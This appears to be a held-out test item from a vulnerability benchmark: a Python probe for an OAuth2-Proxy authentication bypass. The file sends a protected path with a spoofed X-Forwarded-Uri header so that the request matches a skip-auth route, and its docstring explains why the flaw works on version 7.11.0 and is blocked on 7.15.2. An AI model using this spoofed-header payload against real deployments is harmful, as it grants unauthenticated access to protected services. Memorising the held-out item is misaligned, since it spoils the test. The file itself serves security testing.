#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-40575 residual — OAuth2-Proxy X-Forwarded-Uri skip-auth spoof.

The CVE-2025-54576 fix (V1 = 7.11.0) made isAllowedPath() match requestutil.GetRequestPath,
which strips the ?query. BUT GetRequestPath still derives the path from the CLIENT-SUPPLIED
`X-Forwarded-Uri` header whenever the request is proxied (IsProxied == scope.ReverseProxy, and
--reverse-proxy is on). So an unauthenticated attacker sends the PROTECTED path on the request
line while spoofing a header that matches a skip route:

    GET /foo/critical_endpoint            <- real path proxied to the upstream (the flag)
    X-Forwarded-Uri: /foo/anything/bar    <- what isAllowedPath() actually matches

GetRequestPath returns `/foo/anything/bar` (from the header) -> matches `^/foo/.*/bar$` ->
auth is SKIPPED -> oauth2-proxy proxies the REAL path `/foo/critical_endpoint` upstream ->
${PCB_FLAG} is returned to the unauthenticated attacker.

Contract: reaches the flag on V1 (same isAllowedPath sink, query stripped but header trusted).
BLOCKED on V2 (7.15.2): GetRequestPath trusts X-Forwarded-Uri only when
CanTrustForwardedHeaders(req) — i.e. the direct caller IP is in the --trusted-proxy-ip NetSet.
The attacker's direct connection is not trusted -> header ignored -> GetRequestPath falls back
to the real path `/foo/critical_endpoint` -> no skip -> 403, no flag.
"""
from __future__ import annotations

REAL_PATH = "/foo/critical_endpoint"        # actually proxied upstream (the protected asset)
SPOOF_URI = "/foo/anything/bar"             # matches skip route ^/foo/.*/bar$ (auth skipped)


def candidate() -> dict:
    """Request candidate: GET <REAL_PATH> with a spoofed X-Forwarded-Uri, no session."""
    return {
        "probe_id": "cve-2026-40575-xforwarded-uri-skipauth-spoof",
        "method": "GET",
        "path": REAL_PATH,
        "query": "",
        "headers": {"X-Forwarded-Uri": SPOOF_URI},
    }


if __name__ == "__main__":
    c = candidate()
    print(f"{c['method']} {c['path']}  headers={c['headers']}")
